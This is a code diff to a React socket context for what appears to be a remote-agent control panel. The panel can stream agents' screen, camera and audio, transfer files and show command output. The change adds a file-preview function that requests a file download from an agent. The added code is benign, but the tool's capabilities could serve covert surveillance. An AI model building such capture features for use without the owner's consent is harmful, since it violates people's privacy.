@@ -41,6 +41,7 @@ interface SocketContextType {
   stopStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
   uploadFile: (agentId: string, file: File, destinationPath: string) => void;
   downloadFile: (agentId: string, filename: string) => void;
+  previewFile?: (agentId: string, filename: string) => void;
   commandOutput: string[];
   addCommandOutput: (output: string) => void;
   clearCommandOutput: () => void;
@@ -674,6 +675,18 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     }
   }, [socket, connected, addCommandOutput]);
 
+  const previewFile = useCallback((agentId: string, filename: string) => {
+    if (socket && connected) {
+      const downloadId = `preview_${Date.now()}_${Math.random().toString(16).slice(2)}`;
+      socket.emit('download_file', {
+        agent_id: agentId,
+        filename,
+        download_id: downloadId
+      });
+      addCommandOutput(`Previewing ${filename} from ${agentId}`);
+    }
+  }, [socket, connected, addCommandOutput]);
+
   const login = useCallback(async (password: string): Promise<boolean> => {
     try {
       const response = await apiClient.login(password);
@@ -724,6 +737,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     stopStream,
     uploadFile,
     downloadFile,
+    previewFile,
     commandOutput,
     addCommandOutput,
     clearCommandOutput,
